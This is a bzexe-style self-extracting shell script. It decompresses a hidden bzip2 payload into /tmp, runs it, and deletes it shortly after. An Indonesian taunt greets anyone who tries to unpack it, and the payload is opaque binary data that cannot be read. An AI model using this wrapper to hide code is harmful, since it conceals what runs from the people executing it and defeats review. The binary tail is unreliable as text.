#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY���  �߀D0}������~����P��BI"hLM�S�G����4�=MM���P�a �i��� ���4hi�L	��2�4b40F@hѡ�0&� �hb ш�� 
��dFh!520@42 4�4�K�*�RU*����RO������<���cL�yH�<��Y�w�i:��޻��Ys郫�W1Ϗ;��s�#��ar�*�k�ii;�C�Gx ��e��-�#�͟��b�bX��
�+�)���h��}iJ�a��ǻl�������޻*������9��LX�c2��Q�XX�=ʩt��n�r.Rˮ.Y>��K��N�&����Ν������)U;��e]�a�{6u���p$���V�Bg33336
��B/�Y"�-�rݴ��ϰ(�	jp���*f��o1]��`ɣ�)����9⮎K����9����ݯ����=6�:��'Gt��G��k�K���I�os��ONc����#R����y�It�#B�tL��r���i&�����Ѵ�߆y'��[��4�Z�W�O�E���-ap����7�\ה3D�,\%�����l`������1.>�x�:x�@�*	�H�a@f�)NI��Z2L�� ���C�R>k&��Ӓ�I�?v�a2�4�e�yY���t�:Ք����[EM�UUu�t�{t�ز�Пm̗����Wi�s�Z�?��"�*bg�6���,q������<�oؿ�r]Ґ�V��H�����tu�y�i�^
�]"��x���*c�Mg���ATw���3KD/�kMݴkM�+#zN�m�Z���%���dSwx�].&�s�j\��5�b�X�����/tN�<
�Ԍb/�Jr�q�s�p�QS�j��^�JƦ$�t����)n��:��#]�hN��iޤzE:�#�U���,'X�/T�RhD�ܙc^��|���3]!�4/�٩)�E��8�ʽKp~�1�N\�]����bisZ�5Y�J.���=!b�CAt���9��#��xvc��K�wRjL&yLm��㷄�F�dJӖ��6�zf7��/,r�d������:gމa��>�T�jV�<�˅r��]��BB~S�